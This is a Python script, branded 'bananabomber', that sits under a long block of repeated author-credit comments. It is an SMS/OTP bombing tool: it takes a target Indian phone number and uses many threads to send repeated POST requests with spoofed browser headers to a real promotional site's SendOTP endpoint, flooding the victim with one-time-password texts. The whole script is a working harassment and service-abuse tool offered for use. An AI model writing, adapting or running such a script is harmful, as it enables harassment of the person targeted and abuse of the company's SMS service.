# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# coded by x5ee
# @x5ee made this

import requests
import threading
 
def send_otp():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://tu-icc23.coke2home.com',
        'Referer': 'https://tu-icc23.coke2home.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
  
    json_data = {
        'MobileNo': f'{num}',
    }
  
    r = requests.post(
        'https://tu-icc23-be.coke2home.com/AWSBeanstalkHelloWorldWebApp_deploy/api/User/SendOTP',
        headers=headers,
        json=json_data,
    )
  
    print(r.text)
 
def run_threads(num_otp, num_threads):
    threads = []
    for _ in range(num_threads):
        for _ in range(num_otp // num_threads):
            thread = threading.Thread(target=send_otp)
            threads.append(thread)
 
    # start all threads
    for thread in threads:
        thread.start()
 
    # wait for all threads to finish
    for thread in threads:
        thread.join()
 
if __name__ == "__main__":
    try:
        num_otp = int(input("[!] bananabomber by x5ee - enter the number of OTPs to be sent: "))
        num_threads = int(input("[!] bananabomber by x5ee - enter the number of threads: "))
        num = int(input("[!] bananabomber by x5ee - enter the number to bomb, don't include the +91: "))
 
        run_threads(num_otp, num_threads)
    except ValueError:
        print("[!] bananabomber by x5ee - please enter valid numbers for OTPs and threads.")
